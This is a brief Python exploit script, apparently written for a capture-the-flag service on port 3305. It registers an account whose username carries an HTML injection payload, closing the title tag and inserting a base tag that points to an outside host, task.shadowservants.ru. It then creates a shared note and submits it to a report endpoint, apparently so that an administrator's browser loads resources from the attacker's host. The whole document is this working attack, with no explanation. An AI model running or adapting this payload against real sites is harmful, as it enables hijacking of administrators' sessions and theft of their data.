import requests
import sys
import secrets
import re

IP = sys.argv[1]
HOST = f'http://{IP}:3305'
s = requests.Session()

login = secrets.token_hex(5) + '''</title><base href="http://task.shadowservants.ru:7777/">'''
password = secrets.token_hex(5)

r = s.post(f'{HOST}/register', data={'username': login, 'password': password})
if r.status_code != 200:
    raise ValueError("Can't register, got : <{}> '{}'".format(r.status_code, r.text))

r = s.post(f'{HOST}/info', data={'text': 'some text'})
if r.status_code != 200:
    raise ValueError("Can't add text, got : <{}> '{}'".format(r.status_code, r.text))

regex = r"\/share\/(.*)\""
urls = re.findall(regex, r.text)
if len(urls) != 1:
    raise ValueError("Can't find share url".format(r.status_code, r.text))

r = s.post(f'{HOST}/report/{urls[0]}')
print(r.text)
